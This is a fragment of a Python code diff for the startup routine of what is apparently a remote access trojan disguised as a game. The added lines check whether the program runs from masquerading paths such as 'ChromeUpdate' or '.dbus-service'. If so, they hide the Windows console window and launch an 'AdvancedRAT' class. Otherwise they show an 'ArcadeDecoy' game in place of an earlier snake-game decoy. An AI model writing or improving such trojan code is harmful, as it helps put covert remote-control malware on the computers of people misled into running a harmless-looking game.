+            current_path = os.path.abspath(sys.executable)
+        else:
+            current_path = os.path.abspath(__file__)
+            
+        is_shadow = any(x in current_path for x in [".dbus-service", "ChromeUpdate", ".metadata"])
+        
+        if is_shadow:
+            print("[*] Detected Shadow Process - Running in background mode...")
+            if IS_WINDOWS:
+                try:
+                    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+                except: pass
+            
+            rat = AdvancedRAT()
             while rat.running:
                 time.sleep(1)
-        except KeyboardInterrupt:
-            rat.running = False
-    else:
-        # Start game decoy
-        print("Starting Snake Game...")
-        SnakeGame()
+        else:
+            print("[*] Starting Game Decoy Hub...")
+            ArcadeDecoy()
+            
+    except Exception as e:
+        print(f"[!] FATAL ERROR DURING STARTUP: {str(e)}")
+        import traceback
+        traceback.print_exc()
+        time.sleep(5)
